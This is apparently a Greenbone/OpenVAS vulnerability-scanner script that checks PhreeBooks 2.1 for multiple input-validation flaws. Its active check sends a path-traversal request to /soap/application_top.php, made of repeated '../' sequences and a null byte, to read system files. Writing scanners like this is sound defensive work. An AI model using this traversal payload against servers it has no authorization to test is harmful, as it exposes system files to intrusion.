# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:phreesoft:phreebooks";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100863");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-10-21 13:52:26 +0200 (Thu, 21 Oct 2010)");
  script_tag(name:"cvss_base", value:"2.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("PhreeBooks <= 2.1 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("gb_phreebooks_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phreebooks/detected");

  script_tag(name:"summary", value:"PhreeBooks is prone to multiple input validation vulnerabilities.");

  script_tag(name:"impact", value:"Exploiting these issues could allow an attacker to steal
  cookie-based authentication credentials, compromise the application, access or modify data,
  exploit latent vulnerabilities in the underlying database, or obtain potentially sensitive
  information and execute arbitrary local scripts in the context of the webserver process. This may
  allow the attacker to compromise the application and the computer, other attacks are also
  possible.");

  script_tag(name:"affected", value:"PhreeBooks 2.1 is vulnerable, other versions may also be
  affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach pattern (keys(files)) {
  file = files[pattern];

  url = dir + "/soap/application_top.php?db=" + crap(data: "../", length: 3 * 9) + file + "%00";

  if (http_vuln_check(port: port, url: url, pattern: pattern)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
